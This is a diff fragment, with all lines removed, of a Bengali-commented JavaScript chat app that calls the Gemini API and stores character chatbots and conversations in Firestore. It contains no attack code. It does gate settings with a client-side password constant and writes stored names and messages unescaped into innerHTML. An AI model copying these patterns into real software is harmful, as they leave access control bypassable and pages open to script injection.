-        /**
-         * Gemini API থেকে প্রস্তাবিত উত্তর তৈরি এবং প্রদর্শন করে। (Generates and displays suggested replies from the Gemini API.)
-         */
-        async function generateSuggestedReplies() {
-            if (!activeChatbotId || isTyping) return;
-
-            suggestedRepliesContainer.innerHTML = '';
-            suggestedRepliesContainer.classList.remove('hidden');
-
-            const loadingIndicator = document.createElement('div');
-            loadingIndicator.textContent = 'সাজেশন তৈরি হচ্ছে... (Generating suggestions...)';
-            loadingIndicator.classList.add('text-gray-500', 'text-sm', 'p-2');
-            suggestedRepliesContainer.appendChild(loadingIndicator);
-
-            const currentChatMessages = allConversations[activeChatbotId]?.messages || [];
-            const activeCharacter = allCharacters[activeChatbotId];
-
-            const chatTranscript = currentChatMessages
-                .map(msg => `${msg.role === 'user' ? 'User' : activeCharacter?.name || 'Bot'}: ${msg.parts[0].text}`)
-                .join('\n');
-
-            const promptForSuggestions = `তুমি একজন মেসেজিং অ্যাপের স্মার্ট রিপ্লাই অ্যাসিস্ট্যান্ট। তোমার কাজ হলো ব্যবহারকারীকে তার বর্তমান কথোপকথনের উপর ভিত্তি করে ৩টি সংক্ষিপ্ত এবং প্রাসঙ্গিক উত্তর (reply) তৈরি করে দেওয়া। উত্তরগুলো এমনভাবে তৈরি করবে যেন ব্যবহারকারী সেগুলো সরাসরি তার বন্ধুকে পাঠাতে পারে। বন্ধুর চরিত্র এবং কথোপকথনের ধরণ (যেমন: বাংলা, ইংরেজি, মিশ্র ভাষা, ইমোজি) বিবেচনা করে উত্তরগুলো তৈরি করবে।
-
-বর্তমান কথোপকথন ইতিহাস:
-${chatTranscript}
-
-ব্যবহারকারী এখন কি উত্তর দিতে পারে? ৩টি ভিন্ন, সংক্ষিপ্ত এবং প্রাস প্রাসঙ্গিক উত্তর দাও। প্রতিটি উত্তর একটি নতুন লাইনে লিখবে, কোনো অতিরিক্ত টেক্সট বা ব্যাখ্যা দেবে না।`;
-
-            const payload = { contents: [{ role: "user", parts: [{ text: promptForSuggestions }] }] };
-
-            try {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const result = await response.json();
-
-                suggestedRepliesContainer.innerHTML = '';
-
-                if (result.candidates && result.candidates.length > 0 &&
-                    result.candidates[0].content && result.candidates[0].content.parts &&
-                    result.candidates[0].content.parts.length > 0) {
-                    const repliesText = result.candidates[0].content.parts[0].text;
-                    const replies = repliesText.split('\n').filter(line => line.trim() !== '');
-
-                    replies.forEach(reply => {
-                        const button = document.createElement('button');
-                        button.classList.add('suggested-reply-button');
-                        button.textContent = reply.trim();
-                        button.addEventListener('click', () => {
-                            chatInput.value = reply.trim();
-                            suggestedRepliesContainer.classList.add('hidden');
-                        });
-                        suggestedRepliesContainer.appendChild(button);
-                    });
-                } else {
-                    loadingIndicator.textContent = 'সাজেশন তৈরি করা যায়নি। (Could not generate suggestions.)';
-                    console.error("সাজেশনের জন্য অপ্রত্যাশিত API প্রতিক্রিয়া কাঠামো: (Unexpected API response structure for suggestions:)", result);
-                }
-            } catch (error) {
-                loadingIndicator.textContent = 'সাজেশন তৈরি করতে ত্রুটি। (Error generating suggestions.)';
-                console.error("সাজেশনের জন্য জেমিনি API কল করতে ত্রুটি: (Error calling Gemini API for suggestions:)", error);
-            }
-        }
-
-        /**
-         * বর্তমান চ্যাটের সারাংশ তৈরি এবং প্রদর্শন করে। (Generates and displays a summary of the current chat.)
-         */
-        async function summarizeChat() {
-            if (!activeChatbotId) {
-                showCustomMessage("সারাংশ করার জন্য কোনো চ্যাট খোলা নেই। (No chat open to summarize.)");
-                return;
-            }
-
-            const currentChatMessages = allConversations[activeChatbotId]?.messages || [];
-            if (currentChatMessages.length === 0) {
-                showCustomMessage("এই চ্যাটে কোনো মেসেজ নেই সারাংশ করার জন্য। (No messages in this chat to summarize.)");
-                return;
-            }
-
-            showCustomMessage("চ্যাট সারাংশ তৈরি হচ্ছে... (Generating chat summary...)");
-
-            const activeCharacter = allCharacters[activeChatbotId];
-            const chatTranscript = currentChatMessages
-                .map(msg => `${msg.role === 'user' ? 'You' : activeCharacter?.name || 'Bot'}: ${msg.parts[0].text}`)
-                .join('\n');
-
-            const promptForSummary = `এই কথোপকথনটির একটি সংক্ষিপ্ত সারাংশ তৈরি করুন। এটি ${activeCharacter?.name || 'এই চ্যাটবট'} এর সাথে আমার চ্যাট।
-
-কথোপকথন:
-${chatTranscript}
-
-সারাংশ:`;
-
-            const payload = { contents: [{ role: "user", parts: [{ text: promptForSummary }] }] };
-
-            try {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const result = await response.json();
-
-                if (result.candidates && result.candidates.length > 0 &&
-                    result.candidates[0].content && result.candidates[0].content.parts &&
-                    result.candidates[0].content.parts.length > 0) {
-                    const summaryText = result.candidates[0].content.parts[0].text;
-                    showCustomMessage(`চ্যাট সারাংশ: ${summaryText}`);
-                } else {
-                    showCustomMessage("সারাংশ তৈরি করা যায়নি। (Could not generate summary.)");
-                    console.error("সারাংশের জন্য অপ্রত্যাশিত API প্রতিক্রিয়া কাঠামো: (Unexpected API response structure for summary:)", result);
-                }
-            } catch (error) {
-                showCustomMessage("সারাংশ তৈরি করতে ত্রুটি। (Error generating summary.)");
-                console.error("সারাংশের জন্য জেমিনি API কল করতে ত্রুটি: (Error calling Gemini API for summary:)", error);
-            }
-        }
-
-        /**
-         * প্রধান চ্যাট তালিকা ভিউয়ের জন্য একটি চ্যাট তালিকা আইটেম রেন্ডার করে। (Renders a chat list item for the main chat list view.)
-         * @param {string} characterId - ক্যারেক্টার ID। (The character ID.)
-         * @param {object} characterData - ক্যারেক্টারের ডেটা (name, profilePic, status, persona)। (The character's data (name, profilePic, status, persona).)
-         * @param {object} conversationData - কথোপকথনের ডেটা (messages, lastUpdated)। (The conversation data (messages, lastUpdated).)
-         */
-        function renderChatListItem(characterId, characterData, conversationData) {
-            const item = document.createElement('div');
-            item.classList.add('chat-list-item');
-            item.dataset.characterId = characterId;
-
-            let lastMessageText = "";
-            if (conversationData && conversationData.messages && conversationData.messages.length > 0) {
-                const lastMsg = conversationData.messages[conversationData.messages.length - 1];
-                lastMessageText = (lastMsg.role === 'user' ? 'You: ' : '') + lastMsg.parts[0].text;
-            } else if (characterData.initialMessages && characterData.initialMessages.length > 0) {
-                // If no user-generated messages, show initial message as last message
-                const lastInitialMsg = characterData.initialMessages[characterData.initialMessages.length - 1];
-                lastMessageText = (lastInitialMsg.role === 'user' ? 'You: ' : '') + lastInitialMsg.parts[0].text;
-            }
-
-            // Determine display status for the list item
-            let displayStatus = characterData.status;
-            if (conversationData && conversationData.lastUpdated) {
-                const now = Timestamp.now().toDate();
-                const lastUpdatedDate = conversationData.lastUpdated.toDate();
-                const diffMinutes = Math.floor((now - lastUpdatedDate) / (1000 * 60));
-                if (diffMinutes < 1) {
-                    displayStatus = "Active Now";
-                } else if (diffMinutes < 60) {
-                    displayStatus = `${diffMinutes}m ago`;
-                } else if (diffMinutes < 24 * 60) {
-                    displayStatus = `${Math.floor(diffMinutes / 60)}h ago`;
-                } else {
-                    displayStatus = lastUpdatedDate.toLocaleDateString(); // Show date if older than a day
-                }
-            }
-
-            item.innerHTML = `
-                <div class="profile-pic-container relative">
-                    <img src="${characterData.profilePic}" alt="${characterData.name} Profile Picture" class="profile-pic-medium" onerror="this.onerror=null;this.src='https://placehold.co/48x48/cccccc/333333?text=N/A';">
-                    ${characterData.status === 'Active Now' ? '<span class="status-dot"></span>' : (characterData.status.includes('Offline') ? '<span class="status-dot offline"></span>' : '')}
-                </div>
-                <div class="flex-1">
-                    <div class="flex justify-between items-center">
-                        <span class="font-semibold text-gray-800">${characterData.name}</span>
-                        <span class="text-xs text-gray-500">${displayStatus}</span>
-                    </div>
-                    <p class="text-sm text-gray-600 truncate">${lastMessageText}</p>
-                </div>
-            `;
-            recentChatsSection.appendChild(item); // Append to recent chats section
-            item.addEventListener('click', () => openChat(characterId));
-        }
-
-        /**
-         * "Active Now" বিভাগের জন্য একটি সক্রিয় কন্টাক্ট আইtem রেন্ডার করে। (Renders an active contact item for the "Active Now" section.)
-         * @param {string} characterId - ক্যারেক্টার ID। (The character ID.)
-         * @param {object} characterData - ক্যারেক্টারের ডেটা (name, profilePic, status, persona)। (The character's data (name, profilePic, status, persona).)
-         */
-        function renderActiveNowItem(characterId, characterData) {
-            const item = document.createElement('div');
-            item.classList.add('flex', 'flex-col', 'items-center', 'flex-shrink-0', 'chat-list-item');
-            item.dataset.characterId = characterId;
-
-            item.innerHTML = `
-                <div class="relative">
-                    <img src="${characterData.profilePic}" alt="${characterData.name} Profile Picture" class="profile-pic-large" onerror="this.onerror=null;this.src='https://placehold.co/60x60/cccccc/333333?text=N/A';">
-                    <span class="status-dot"></span>
-                </div>
-                <span class="text-xs text-gray-600 mt-1">${characterData.name.split(' ')[0]}</span> `;
-            activeNowList.appendChild(item);
-            item.addEventListener('click', () => openChat(characterId));
-        }
-
-        /**
-         * "People" তালিকা ভিউয়ের জন্য একটি কন্টাক্ট আইটেম রেন্ডার করে। (Renders a contact item for the "People" list view.)
-         * @param {string} characterId - ক্যারেক্টার ID। (The character ID.)
-         * @param {object} characterData - ক্যারেক্টারের ডেটা (name, profilePic, status, persona)। (The character's data (name, profilePic, status, persona).)
-         */
-        function renderPeopleListItem(characterId, characterData) {
-            const item = document.createElement('div');
-            item.classList.add('people-list-item');
-            item.dataset.characterId = characterId;
-
-            item.innerHTML = `
-                <div class="profile-pic-container relative">
-                    <img src="${characterData.profilePic}" alt="${characterData.name} Profile Picture" class="profile-pic-medium" onerror="this.onerror=null;this.src='https://placehold.co/48x48/cccccc/333333?text=N/A';">
-                    ${characterData.status === 'Active Now' ? '<span class="status-dot"></span>' : (characterData.status.includes('Offline') ? '<span class="status-dot offline"></span>' : '')}
-                </div>
-                <div class="flex-1">
-                    <span class="contact-name">${characterData.name}</span>
-                    <span class="status-text">${characterData.status}</span>
-                </div>
-            `;
-            allPeopleList.appendChild(item);
-            item.addEventListener('click', () => openChat(characterId));
-        }
-
-        /**
-         * নির্বাচিত কন্টাক্টের জন্য ব্যক্তিগত চ্যাট ভিউ খোলে। (Opens the individual chat view for the selected contact.)
-         * @param {string} characterId - চ্যাট খোলার জন্য ক্যারেক্টার ID। (The character ID to open the chat for.)
-         */
-        function openChat(characterId) {
-            const characterData = allCharacters[characterId];
-            if (!characterData) {
-                showCustomMessage("ক্যারেক্টার ডেটা পাওয়া যায়নি। (Character data not found.)");
-                return;
-            }
-
-            activeChatbotId = characterId;
-
-            chatContactName.textContent = characterData.name;
-            chatContactPic.src = characterData.profilePic;
-            chatContactPic.classList.add('profile-pic-small');
-            chatContactPic.onerror = function() { this.onerror=null;this.src='https://placehold.co/32x32/cccccc/333333?text=N/A'; };
-            chatContactStatus.textContent = characterData.status;
-
-            chatMessagesDisplay.innerHTML = '';
-            suggestedRepliesContainer.classList.add('hidden');
-
-            // Set up a real-time listener for the specific conversation
-            if (unsubscribeFromActiveChat) {
-                unsubscribeFromActiveChat(); // Unsubscribe from previous chat listener
-            }
-
-            const conversationDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, characterId);
-            unsubscribeFromActiveChat = onSnapshot(conversationDocRef, (docSnap) => {
-                if (docSnap.exists()) {
-                    const convData = docSnap.data();
-                    allConversations[characterId] = { id: characterId, ...convData }; // Update global conversations object
-                    renderMessages(convData.messages || []);
-                } else {
-                    // If conversation document doesn't exist, create it with initial messages
-                    console.log(`Conversation for ${characterId} not found, creating new.`);
-                    const initialMessages = characterData.initialMessages || [];
-                    setDoc(conversationDocRef, {
-                        chatbotId: characterId,
-                        chatbotName: characterData.name,
-                        messages: initialMessages,
-                        lastUpdated: Timestamp.now()
-                    }).then(() => {
-                        renderMessages(initialMessages);
-                        // If there are no initial messages, send a greeting from the AI
-                        if (initialMessages.length === 0) {
-                            sendMessageToGemini("আমার সাথে কথোপকথন শুরু করো।", characterId, characterData.name, characterData.profilePic, characterData.persona);
-                        }
-                    }).catch(error => {
-                        console.error("Error creating new conversation:", error);
-                        showCustomMessage("নতুন কথোপকথন তৈরি করতে ব্যর্থ হয়েছে। (Failed to create new conversation.)");
-                    });
-                }
-            }, (error) => {
-                console.error("Error listening to active chat:", error);
-                showCustomMessage("চ্যাট লোড করতে ব্যর্থ হয়েছে। (Failed to load chat.)");
-            });
-
-            // Hide sidebar on mobile when opening chat
-            toggleMobileSidebar(false);
-
-            // Other views hidden, individual chat view shown
-            peopleView.classList.add('hidden');
-            busesView.classList.add('hidden');
-            settingsView.classList.add('hidden');
-            individualChatView.classList.remove('hidden');
-            chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight;
-        }
-
-        /**
-         * বর্তমান কন্টাক্টের মেসেজগুলো রেন্ডার করে। (Renders the messages for the current contact.)
-         * @param {Array} messages - মেসেজ অবজেক্টের একটি অ্যারে। (An array of message objects.)
-         */
-        function renderMessages(messages) {
-            chatMessagesDisplay.innerHTML = ''; // Clear previous messages
-            if (messages && messages.length > 0) {
-                const lastMessageIndex = messages.length - 1;
-                messages.forEach((msg, index) => {
-                    const sender = msg.role === 'user' ? 'You' : allCharacters[activeChatbotId]?.name || 'Bot';
-                    const pic = msg.role === 'user' ? '' : allCharacters[activeChatbotId]?.profilePic;
-                    addMessageToChat(msg.parts[0].text, sender, pic, (index === lastMessageIndex && msg.role === 'model'));
-                });
-            } else {
-                const emptyChatDiv = document.createElement('div');
-                emptyChatDiv.classList.add('text-center', 'text-gray-500', 'mt-10');
-                emptyChatDiv.textContent = `Say hello to ${allCharacters[activeChatbotId]?.name || 'this chatbot'}!`;
-                chatMessagesDisplay.appendChild(emptyChatDiv);
-            }
-            chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight; // Scroll to bottom
-        }
-
-        /**
-         * চ্যাট তালিকাগুলি (Active Now, Recent Chats, All People) ইনিশিয়ালাইজ এবং রেন্ডার করে। (Initializes and renders the chat lists (Active Now, Recent Chats, All People).)
-         * This function now relies on `allCharacters` and `allConversations` global objects.
-         */
-        function renderChatLists() {
-            activeNowList.innerHTML = '';
-            recentChatsSection.innerHTML = '';
-            allPeopleList.innerHTML = '';
-
-            const activeContacts = [];
-            const recentContacts = []; // Will be sorted by lastUpdated timestamp
-            const allContacts = []; // All characters, sorted alphabetically by name
-
-            // Populate allContacts and identify active ones
-            for (const characterId in allCharacters) {
-                const data = allCharacters[characterId];
-                allContacts.push({ id: characterId, data: data });
-                if (data.status === 'Active Now') {
-                    activeContacts.push({ id: characterId, data: data });
-                }
-            }
-            allContacts.sort((a, b) => a.data.name.localeCompare(b.data.name));
-
-            // Populate recentContacts based on lastUpdated timestamp
-            for (const conversationId in allConversations) {
-                const convData = allConversations[conversationId];
-                const charData = allCharacters[conversationId]; // Get character data using conversationId (which is characterId)
-                if (charData) {
-                    recentContacts.push({
-                        id: conversationId,
-                        characterData: charData,
-                        conversationData: convData
-                    });
-                }
-            }
-
-            // Sort recent contacts by lastUpdated timestamp (descending)
-            recentContacts.sort((a, b) => {
-                const timeA = a.conversationData.lastUpdated ? a.conversationData.lastUpdated.toDate().getTime() : 0;
-                const timeB = b.conversationData.lastUpdated ? b.conversationData.lastUpdated.toDate().getTime() : 0;
-                return timeB - timeA;
-            });
-
-            // Render active contacts
-            activeContacts.forEach(contact => renderActiveNowItem(contact.id, contact.data));
-
-            // Render recent chats
-            recentContacts.forEach(contact => renderChatListItem(contact.id, contact.characterData, contact.conversationData));
-
-            // Render all people
-            allContacts.forEach(contact => renderPeopleListItem(contact.id, contact.data));
-        }
-
-        // --- Custom Message Box Functions (Replaces alert/confirm) ---
-        let messageBoxTimeout;
-        function showCustomMessage(message, duration = 3000) {
-            clearTimeout(messageBoxTimeout); // Clear any existing timeout
-            customMessageBox.textContent = message;
-            customMessageBox.classList.remove('hidden');
-            customMessageBox.style.opacity = '1';
-
-            messageBoxTimeout = setTimeout(() => {
-                customMessageBox.style.opacity = '0';
-                customMessageBox.addEventListener('transitionend', function handler() {
-                    customMessageBox.classList.add('hidden');
-                    customMessageBox.removeEventListener('transitionend', handler);
-                }, { once: true });
-            }, duration);
-        }
-
-        // --- Password Modal Functions ---
-        function showPasswordModal() {
-            passwordModal.classList.remove('hidden');
-            passwordInput.value = '';
-            passwordError.classList.add('hidden');
-            passwordInput.focus();
-        }
-
-        function hidePasswordModal() {
-            passwordModal.classList.add('hidden');
-        }
-
-        passwordSubmitButton.addEventListener('click', () => {
-            if (passwordInput.value === SECRET_PASSWORD) {
-                hidePasswordModal();
-                showSettingsView();
-            } else {
-                passwordError.classList.remove('hidden');
-            }
-        });
-
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                passwordSubmitButton.click();
-            }
-        });
-
-        // --- Confirmation Modal Functions ---
-        function showConfirmationModal(title, text, onConfirm) {
-            confirmationMessageTitle.textContent = title;
-            confirmationMessageText.textContent = text;
-            confirmCallback = onConfirm;
-            confirmationModal.classList.remove('hidden');
-        }
-
-        function hideConfirmationModal() {
-            confirmationModal.classList.add('hidden');
-            confirmCallback = null;
-        }
-
-        confirmDeleteButton.addEventListener('click', () => {
-            if (confirmCallback) {
-                confirmCallback(true);
-            }
-            hideConfirmationModal();
-        });
-
-        cancelDeleteButton.addEventListener('click', () => {
-            if (confirmCallback) {
-                confirmCallback(false);
-            }
-            hideConfirmationModal();
-        });
-
-        // --- Settings View Functions ---
-        function showSettingsView() {
-            // Hide all other views
-            peopleView.classList.add('hidden');
-            busesView.classList.add('hidden');
-            individualChatView.classList.add('hidden');
-            suggestedRepliesContainer.classList.add('hidden');
-
-            // Show settings view
-            settingsView.classList.remove('hidden');
-            renderCharacterList();
-            clearCharacterForm();
-            toggleMobileSidebar(false); // Close sidebar if open
-        }
-
-        function hideSettingsView() {
-            settingsView.classList.add('hidden');
-            // Go back to the main chat list view (which is the sidebar content)
-            showChatListView(); // Show the chat list view
-            chatsTab.click(); // Ensure chats tab is active
-        }
-
-        function renderCharacterList() {
-            characterList.innerHTML = '';
-            const sortedCharacterNames = Object.keys(allCharacters).sort();
-
-            if (sortedCharacterNames.length === 0) {
-                characterList.innerHTML = '<p class="p-4 text-gray-500">কোনো ক্যারেক্টার পাওয়া যায়নি। একটি নতুন যোগ করুন! (No characters found. Add a new one!)</p>';
-                return;
-            }
-
-            sortedCharacterNames.forEach(name => {
-                const data = allCharacters[name];
-                const item = document.createElement('div');
-                item.classList.add('character-item', 'flex', 'justify-between', 'items-center');
-                item.innerHTML = `
-                    <div class="flex items-center flex-1">
-                        <img src="${data.profilePic}" alt="${name} Profile Picture" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=N/A';">
-                        <span class="font-medium text-gray-800 truncate">${name}</span>
-                    </div>
-                    <div class="actions flex-shrink-0">
-                        <button class="edit-character-button" data-character-id="${name}">Edit</button>
-                        <button class="delete-character-button" data-character-id="${name}">Delete</button>
-                    </div>
-                `;
-                characterList.appendChild(item);
-            });
-
-            document.querySelectorAll('.edit-character-button').forEach(button => {
-                button.addEventListener('click', (e) => {
-                    loadCharacterToForm(e.target.dataset.characterId);
-                });
-            });
-            document.querySelectorAll('.delete-character-button').forEach(button => {
-                button.addEventListener('click', (e) => {
-                    showConfirmationModal(
-                        'মুছে ফেলার নিশ্চিতকরণ (Confirm Deletion)',
-                        `আপনি কি নিশ্চিত যে আপনি "${e.target.dataset.characterId}" এবং এর সমস্ত চ্যাট ইতিহাস মুছে ফেলতে চান? এটি পূর্বাবস্থায় ফেরানো যাবে না। (Are you sure you want to delete "${e.target.dataset.characterId}" and all its chat history? This cannot be undone.)`,
-                        (confirmed) => {
-                            if (confirmed) {
-                                deleteCharacter(e.target.dataset.characterId);
-                            }
-                        }
-                    );
-                });
-            });
-        }
-
-        function clearCharacterForm() {
-            currentEditContactName.value = '';
-            characterNameInput.value = '';
-            characterImageInput.value = '';
-            characterStatusInput.value = '';
-            characterPersonaInput.value = '';
-            formTitle.textContent = 'নতুন ক্যারেক্টার যোগ করুন (Add New Character)';
-            cancelEditButton.classList.add('hidden');
-            saveCharacterButton.textContent = 'ক্যারেক্টার সেভ করুন (Save Character)';
-            addNewCharacterButton.classList.remove('hidden'); // Ensure "Add New" button is visible
-        }
-
-        function loadCharacterToForm(characterId) {
-            const data = allCharacters[characterId];
-            if (data) {
-                currentEditContactName.value = characterId; // Store original ID for update
-                characterNameInput.value = data.name;
-                characterImageInput.value = data.profilePic;
-                characterStatusInput.value = data.status;
-                characterPersonaInput.value = data.persona;
-                formTitle.textContent = `ক্যারেক্টার এডিট করুন: ${data.name} (Edit Character: ${data.name})`;
-                cancelEditButton.classList.remove('hidden');
-                saveCharacterButton.textContent = 'ক্যারেক্টার আপডেট করুন (Update Character)';
-                addNewCharacterButton.classList.add('hidden'); // Hide "Add New" button when editing
-            }
-        }
-
-        async function saveCharacter() {
-            const originalId = currentEditContactName.value; // This is the original character name/ID
-            const newName = characterNameInput.value.trim();
-            const newImage = characterImageInput.value.trim();
-            const newStatus = characterStatusInput.value.trim();
-            const newPersona = characterPersonaInput.value.trim();
-
-            if (!newName || !newImage || !newPersona) {
-                showCustomMessage('অনুগ্রহ করে ক্যারেক্টারের সমস্ত ফিল্ড পূরণ করুন। (Please fill in all character fields.)');
-                return;
-            }
-
-            // Check for duplicate name if it's a new character or name is changed
-            if (!originalId || (originalId !== newName && allCharacters[newName])) {
-                 if (allCharacters[newName] && newName !== originalId) { // Check if newName already exists for a different character
-                    showCustomMessage(`"${newName}" নামের একটি ক্যারেক্টার ইতিমধ্যেই বিদ্যমান। অনুগ্রহ করে একটি ভিন্ন নাম নির্বাচন করুন। (A character with the name "${newName}" already exists. Please choose a different name.)`);
-                    return;
-                }
-            }
-
-            const characterDocRef = doc(db, `artifacts/${appId}/users/${userId}/characters`, newName); // Use newName as document ID
-
-            try {
-                // If the name changed, delete the old character document and its conversation
-                if (originalId && originalId !== newName) {
-                    await deleteDoc(doc(db, `artifacts/${appId}/users/${userId}/characters`, originalId));
-                    // Also delete the old conversation if it exists
-                    const oldConversationDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, originalId);
-                    try {
-                        await deleteDoc(oldConversationDocRef);
-                    } catch (e) {
-                        console.warn(`Old conversation for ${originalId} not found or could not be deleted.`);
-                    }
-                }
-
-                // Save or update the character
-                await setDoc(characterDocRef, {
-                    name: newName,
-                    profilePic: newImage,
-                    status: newStatus,
-                    persona: newPersona,
-                    // Initial messages are only for default setup, not managed through form
-                    // Firestore will handle persistence of 'messages' in conversations collection
-                });
-
-                // If it's a new character, or name changed, ensure conversation exists
-                const conversationDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, newName);
-                const conversationSnap = await getDoc(conversationDocRef);
-                if (!conversationSnap.exists()) {
-                    await setDoc(conversationDocRef, {
-                        chatbotId: newName,
-                        chatbotName: newName,
-                        messages: [], // Start with empty messages for new/renamed character
-                        lastUpdated: Timestamp.now()
-                    });
-                } else if (originalId && originalId !== newName) {
-                    // If name changed, and old conversation existed, copy its messages to new conversation
-                    const oldConvData = allConversations[originalId];
-                    if (oldConvData && oldConvData.messages) {
-                        await updateDoc(conversationDocRef, {
-                            messages: oldConvData.messages,
-                            lastUpdated: oldConvData.lastUpdated || Timestamp.now()
-                        });
-                    }
-                }
-
-                showCustomMessage(`ক্যারেক্টার "${newName}" সফলভাবে সেভ করা হয়েছে! (Character "${newName}" saved successfully!)`);
-                clearCharacterForm();
-                // Data will re-render via Firestore listeners
-            } catch (error) {
-                console.error("ক্যারেক্টার সেভ করতে ত্রুটি: (Error saving character:)", error);
-                showCustomMessage("ক্যারেক্টার সেভ করতে ব্যর্থ হয়েছে। (Failed to save character.)");
-            }
-        }
-
-        async function deleteCharacter(characterId) {
-            const characterDocRef = doc(db, `artifacts/${appId}/users/${userId}/characters`, characterId);
-            const conversationDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, characterId);
-
-            try {
-                await deleteDoc(characterDocRef);
-                // Also delete the associated conversation
-                try {
-                    await deleteDoc(conversationDocRef);
-                } catch (e) {
-                    console.warn(`Conversation for ${characterId} not found or could not be deleted.`);
-                }
-                showCustomMessage(`ক্যারেক্টার "${characterId}" সফলভাবে মুছে ফেলা হয়েছে। (Character "${characterId}" deleted successfully.)`);
-                // Data will re-render via Firestore listeners
-                if (activeChatbotId === characterId) {
-                    activeChatbotId = null; // Clear active chat if deleted
-                    showChatListView(); // Go back to chat list view
-                }
-            } catch (error) {
-                console.error("ক্যারেক্টার মুছে ফেলতে ত্রুটি: (Error deleting character:)", error);
-                showCustomMessage("ক্যারেক্টার মুছে ফেলতে ব্যর্থ হয়েছে। (Failed to delete character.)");
-            }
-        }
-
-
-        // --- View Management Functions ---
-        function showChatListView() {
-            // Hide all other views
-            peopleView.classList.add('hidden');
-            busesView.classList.add('hidden');
-            individualChatView.classList.add('hidden');
-            settingsView.classList.add('hidden');
-            suggestedRepliesContainer.classList.add('hidden');
-
-            // Show chat list view (which is the sidebar content)
-            // The sidebar itself is always visible on desktop, toggled on mobile
-            // The content within the sidebar is what we manage here
-            document.getElementById('main-content-area').classList.remove('hidden'); // Ensure main content area is visible
-            // No need to show chatListView explicitly as it's part of the sidebar
-        }
-
-        function showPeopleView() {
-            busesView.classList.add('hidden');
-            individualChatView.classList.add('hidden');
-            settingsView.classList.add('hidden');
-            peopleView.classList.remove('hidden');
-            suggestedRepliesContainer.classList.add('hidden');
-            toggleMobileSidebar(false); // Close sidebar on mobile
-        }
-
-        function showBusesView() {
-            peopleView.classList.add('hidden');
-            individualChatView.classList.add('hidden');
-            settingsView.classList.add('hidden');
-            busesView.classList.remove('hidden');
-            suggestedRepliesContainer.classList.add('hidden');
-            toggleMobileSidebar(false); // Close sidebar on mobile
-        }
-
-        // --- Mobile Sidebar Toggle ---
-        function toggleMobileSidebar(forceState = null) {
-            if (window.innerWidth >= 768) { // Only apply on mobile
-                sidebar.classList.remove('-translate-x-full'); // Ensure sidebar is visible on desktop
-                sidebarOverlay.classList.add('hidden'); // Hide overlay on desktop
-                return;
-            }
-
-            if (forceState === true) {
-                sidebar.classList.remove('-translate-x-full');
-                sidebarOverlay.classList.remove('hidden');
-            } else if (forceState === false) {
-                sidebar.classList.add('-translate-x-full');
-                sidebarOverlay.classList.add('hidden');
-            } else {
-                // Toggle
-                sidebar.classList.toggle('-translate-x-full');
-                sidebarOverlay.classList.toggle('hidden');
-            }
-        }
-
-        // --- Firebase Initialization ---
-        async function initFirebaseAndAuth() {
-            try {
-                app = initializeApp(firebaseConfig);
-                db = getFirestore(app);
-                auth = getAuth(app);
-
-                onAuthStateChanged(auth, async (user) => {
-                    if (user) {
-                        userId = user.uid;
-                        userIdDisplay.textContent = userId;
-                        console.log("Firebase Auth State Changed: User ID:", userId);
-                        loadingOverlay.classList.add('hidden');
-                        startListeningToData(); // Start listening to both characters and conversations
-                    } else {
-                        try {
-                            if (initialAuthToken) {
-                                await signInWithCustomToken(auth, initialAuthToken);
-                                console.log("Signed in with custom token.");
-                            } else {
-                                await signInAnonymously(auth);
-                                console.log("Signed in anonymously.");
-                            }
-                        } catch (authError) {
-                            console.error("Firebase Auth Error:", authError);
-                            showError("Failed to authenticate. Please try again.");
-                            // Fallback to a random UUID if authentication completely fails
-                            userId = crypto.randomUUID();
-                            userIdDisplay.textContent = userId + " (Guest)";
-                            loadingOverlay.classList.add('hidden');
-                            startListeningToData(); // Still try to load data for guest
-                        }
-                    }
-                });
-            } catch (err) {
-                showError("Failed to initialize Firebase. Please check your configuration.");
-            }
-        }
-
-        /**
-         * Shows an error message in the dedicated error display.
-         * @param {string} message - The error message to display.
-         */
-        function showError(message) {
-            errorTextSpan.textContent = message;
-            errorMessageDiv.classList.remove('hidden');
-            loadingOverlay.classList.add('hidden'); // Hide loading overlay if error occurs
-        }
-
-        /**
-         * Starts listening to characters and conversations collections in Firestore.
-         */
-        function startListeningToData() {
-            if (!db || !userId) {
-                console.warn("Firestore or User ID not available for data listeners.");
-                return;
-            }
-
-            // --- Listen to Characters Collection ---
-            const charactersRef = collection(db, `artifacts/${appId}/users/${userId}/characters`);
-            unsubscribeFromCharacters = onSnapshot(query(charactersRef), async (snapshot) => {
-                const fetchedCharacters = {};
-                snapshot.docs.forEach(doc => {
-                    fetchedCharacters[doc.id] = { id: doc.id, ...doc.data() };
-                });
-                allCharacters = fetchedCharacters;
-                console.log("Characters fetched:", Object.keys(allCharacters).length);
-
-                // Populate default characters if they don't exist for this user
-                // User requested to remove initial characters, so this loop is now effectively skipped
-                // unless defaultChatbots is explicitly populated.
-                for (const defaultCharId in defaultChatbots) {
-                    if (!allCharacters[defaultCharId]) {
-                        const defaultCharData = defaultChatbots[defaultCharId];
-                        const charDocRef = doc(db, `artifacts/${appId}/users/${userId}/characters`, defaultCharId);
-                        await setDoc(charDocRef, {
-                            name: defaultCharId, // Fixed: Use defaultCharId as the name
-                            profilePic: defaultCharData.profilePic,
-                            status: defaultCharData.status,
-                            persona: defaultCharData.persona
-                        });
-                        // Also create an empty conversation for it if it doesn't exist
-                        const convDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, defaultCharId);
-                        const convSnap = await getDoc(convDocRef);
-                        if (!convSnap.exists()) {
-                            await setDoc(convDocRef, {
-                                chatbotId: defaultCharId,
-                                chatbotName: defaultCharData.name,
-                                messages: defaultCharData.initialMessages || [],
-                                lastUpdated: Timestamp.now()
-                            });
-                        }
-                    }
-                }
-                renderChatLists(); // Re-render chat lists with updated character data
-                if (settingsView.classList.contains('hidden') === false) { // Only re-render settings list if it's visible
